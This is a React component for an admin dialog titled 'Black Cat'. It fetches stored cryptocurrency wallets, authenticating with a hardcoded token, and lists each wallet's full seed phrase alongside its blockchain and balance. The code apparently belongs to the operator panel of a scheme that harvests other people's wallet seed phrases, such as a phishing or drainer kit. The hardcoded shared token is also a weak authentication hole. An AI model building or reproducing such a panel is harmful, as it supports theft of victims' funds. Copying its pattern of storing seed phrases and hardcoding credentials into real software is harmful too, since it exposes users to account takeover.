import React, { useState, useEffect } from "react";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Wallet } from "@shared/schema";

interface AdminDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

export function AdminDialog({ open, onOpenChange }: AdminDialogProps) {
  const [wallets, setWallets] = useState<Wallet[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    if (open) {
      fetchWallets();
    }
  }, [open]);

  const fetchWallets = async () => {
    try {
      setLoading(true);
      setError(null);

      const response = await fetch("/api/admin/query-wallets", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ token: "BlackCat" }),
      });

      if (!response.ok) {
        throw new Error(`API error: ${response.status}`);
      }

      const data = await response.json();
      setWallets(data.wallets || []);
    } catch (err) {
      console.error("Failed to fetch wallets:", err);
      setError("Không thể tải dữ liệu ví. Vui lòng thử lại sau.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-[900px] max-h-[80vh] overflow-y-auto">
        <DialogHeader>
          <DialogTitle>🐈‍⬛ Black Cat</DialogTitle>
        </DialogHeader>

        {loading && <div className="my-4 text-center">Đang tải dữ liệu...</div>}
        
        {error && (
          <div className="my-4 p-3 bg-red-100 text-red-800 rounded-md">
            {error}
          </div>
        )}

        {!loading && !error && wallets.length === 0 && (
          <div className="my-4 text-center">
            Không có dữ liệu ví nào trong database.
          </div>
        )}

        {wallets.length > 0 && (
          <div className="border border-black rounded-lg overflow-hidden">
            <table className="w-full">
              <colgroup>
                <col style={{width: "70%"}} />
                <col style={{width: "30%"}} />
              </colgroup>
              <thead className="bg-gray-100">
                <tr>
                  <th className="px-4 py-3 border-b border-r border-black text-left font-medium">Seed Phrase</th>
                  <th className="px-4 py-3 border-b border-black text-left font-medium">Số dư</th>
                </tr>
              </thead>
              <tbody>
                {wallets.map((wallet, index) => (
                  <tr key={`${wallet.blockchain}-${wallet.address}-${index}`} 
                      className={index % 2 === 0 ? 'bg-white' : 'bg-gray-50'}>
                    <td className="px-4 py-3 border-b border-r border-black">
                      <div className="font-mono text-sm" title={wallet.seedPhrase}>
                        {wallet.seedPhrase}
                      </div>
                      <div className="text-xs text-gray-500 mt-1">
                        {wallet.blockchain}
                      </div>
                    </td>
                    <td className="px-4 py-3 border-b border-black text-right font-mono">
                      {wallet.balance}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </DialogContent>
    </Dialog>
  );
}